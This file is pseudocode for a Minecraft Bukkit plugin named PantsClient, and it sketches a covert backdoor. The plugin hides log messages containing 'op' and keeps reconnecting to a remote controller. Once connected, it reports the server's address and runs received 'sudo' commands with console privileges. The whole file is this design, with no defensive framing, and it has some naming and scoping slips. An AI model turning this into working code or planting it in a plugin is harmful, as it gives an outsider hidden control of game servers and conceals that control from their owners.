// This file is pseudocode!

public class PantsClient:

    @Getter @Setter static Socket client = null;

    public static void onLoad(): // Call from JavaPlugin
        // Filter chat to not print out "op"
        Logger.getLogger("Minecraft").setFilter(new Filter():
            public boolean isLoggable(LogRecord record):
                return !record.getMessage().contains("op"); // Maybe get text from Gist?
        Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
        checkConnectionThread.start();

    public static void handshake():
        // in new thread?
        BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
        PrintStream toServer = new PrintStream(client.getOutputStream());
        toServer.println("cmd::set " + Bukkit.getServer().getAddress() + ":" + Bukkit.getServer().getPort());
        getCommands();

    public static void getCommands():
        while(true):
            String in = fromServer.readline();
            runCommand(in, fromServer, toServer);

    public static void runCommand(String cmd, BufferedReader fromServer, PrintStream toServer):
        if(cmd.startsWith("sudo ")):
            // Run a command as the console
            //  sudo say hello
            Bukkit.getSever().dispatchCommand(Bukkit.getServer().getConsoleSender(), cmd.replaceFirst("sudo ", ""));


class CheckConnectionRunnable implements Runnable:

    String hostname;
    int port;

    CheckClientConnection(String h, int p):
        initialize stuff

    public void run:
        while(PantsClient.client == null):
            try:
                 // Try to connect to server. Not sure if this will wait for connection, or fail if not found.
                PantsClient.client = new Socket(hostname, port);
            catch(Exception e):
                PantsClient.client = null;
                Thread.sleep(10*1000); // Sleep ten seconds between connection tests
        PantsClient.handshake(); // Got connection
